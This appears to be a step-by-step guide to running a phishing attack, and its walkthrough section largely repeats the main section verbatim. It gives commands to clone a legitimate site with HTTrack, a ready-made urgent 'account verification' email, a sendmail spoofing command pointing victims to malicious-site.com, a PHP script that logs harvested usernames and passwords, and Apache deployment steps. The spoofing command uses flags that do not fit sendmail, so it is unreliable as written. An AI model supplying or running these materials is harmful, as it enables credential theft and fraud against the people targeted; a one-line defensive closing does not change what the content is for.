# Summary
Phishing is a social engineering attack often used to steal user data, including login credentials and credit card numbers. It occurs when an attacker, masquerading as a trusted entity, dupes a victim into opening an email, instant message, or text message. The recipient is then tricked into clicking a malicious link, which can lead to the installation of malware, the freezing of the system as part of a ransomware attack, or the revealing of sensitive information.

Here's an overview of how a typical phishing attack might be executed:

1. **Preparation:** Craft a convincing email that appears to be from a trusted source, such as a bank, social media site, or a colleague.
2. **Delivery:** Send the email to the target(s), often using techniques to bypass spam filters and increase the likelihood of it being opened.
3. **Deception:** The email usually contains a message urging the recipient to take immediate action, such as verifying account information or resetting a password.
4. **Exploitation:** When the recipient clicks on the link in the email, they are redirected to a fake website that mimics a legitimate one, where they are asked to enter their personal information.
5. **Execution:** Once the user submits their information, it is captured by the attacker, who can then use it for malicious purposes.

# Execution
To execute a phishing attack, an attacker typically follows these steps:

1. **Create a Fake Website:** Develop a website that closely resembles the legitimate site the attacker is spoofing.
2. **Craft the Phishing Email:** Write an email that appears to be from the trusted entity, using logos, color schemes, and language that match the original.
3. **Send the Email:** Use email spoofing techniques to make the email appear to come from the trusted source, and send it to the target(s).
4. **Harvest Credentials:** When the target enters their information on the fake site, the attacker captures this data.

#### Step 1: Create a Fake Website

1. **Clone the Legitimate Website:** Use a tool like `HTTrack` to clone the legitimate website.

```
httrack http://example.com -O /path/to/clone
```

2. **Modify the Clone:** Make necessary changes to the cloned website to ensure that the form actions point to a server controlled by the attacker, where the credentials will be sent.

#### Step 2: Craft the Phishing Email

1. **Create the Email Content:** Write a convincing email that mimics the communication style of the trusted entity.

```
Subject: Urgent: Account Verification Needed

Dear Customer,

We have noticed suspicious activity on your account. Please click the link below to verify your account information.

[Verify Account](http://malicious-site.com)

Thank you,
Trusted Entity Support Team
```

2. **Spoof the Email Address:** Use tools like `sendmail` or services like `SendGrid` to spoof the sender's email address.

#### Step 3: Send the Email

1. **Send the Email Using a Spoofing Tool:**

```
sendmail -f "support@trustedentity.com" -t target@example.com -u "Urgent: Account Verification Needed" -m "Dear Customer,\n\nWe have noticed suspicious activity on your account. Please click the link below to verify your account information.\n\n[Verify Account](http://malicious-site.com)\n\nThank you,\nTrusted Entity Support Team"
```

#### Step 4: Harvest Credentials

1. **Set Up a Server to Capture Credentials:** Use a tool like `PHP` to capture the credentials entered on the fake website.

```
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    file_put_contents("creds.txt", "Username: $username\nPassword: $password\n", FILE_APPEND);
}
?>
```

2. **Host the Fake Website:** Deploy the modified clone and the credential harvesting script on a web server.

```
# Example using Apache
sudo cp -r /path/to/clone /var/www/html/
sudo systemctl restart apache2
```

# Example Execution
Below is a simplified walkthrough of how an attacker might execute a phishing attack:

#### Step 1: Create a Fake Website

1. **Clone the Legitimate Website:**

```
httrack http://example.com -O /path/to/clone
```

2. **Modify the Clone:** Ensure form actions point to a credential harvesting script.

#### Step 2: Craft the Phishing Email

1. **Create the Email Content:**

```
Subject: Urgent: Account Verification Needed

Dear Customer,

We have noticed suspicious activity on your account. Please click the link below to verify your account information.

[Verify Account](http://malicious-site.com)

Thank you,
Trusted Entity Support Team
```

2. **Spoof the Email Address:**

```
sendmail -f "support@trustedentity.com" -t target@example.com -u "Urgent: Account Verification Needed" -m "Dear Customer,\n\nWe have noticed suspicious activity on your account. Please click the link below to verify your account information.\n\n[Verify Account](http://malicious-site.com)\n\nThank you,\nTrusted Entity Support Team"
```

#### Step 3: Send the Email

1. **Send the Email Using a Spoofing Tool:**

```
sendmail -f "support@trustedentity.com" -t target@example.com -u "Urgent: Account Verification Needed" -m "Dear Customer,\n\nWe have noticed suspicious activity on your account. Please click the link below to verify your account information.\n\n[Verify Account](http://malicious-site.com)\n\nThank you,\nTrusted Entity Support Team"
```

#### Step 4: Harvest Credentials

1. **Set Up a Server to Capture Credentials:**

```
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    file_put_contents("creds.txt", "Username: $username\nPassword: $password\n", FILE_APPEND);
}
?>
```

2. **Host the Fake Website:**

```
# Example using Apache
sudo cp -r /path/to/clone /var/www/html/
sudo systemctl restart apache2
```

By following these steps, an attacker can execute a phishing attack to deceive the target into providing sensitive information. It is important to recognize and understand these methods to effectively defend against them.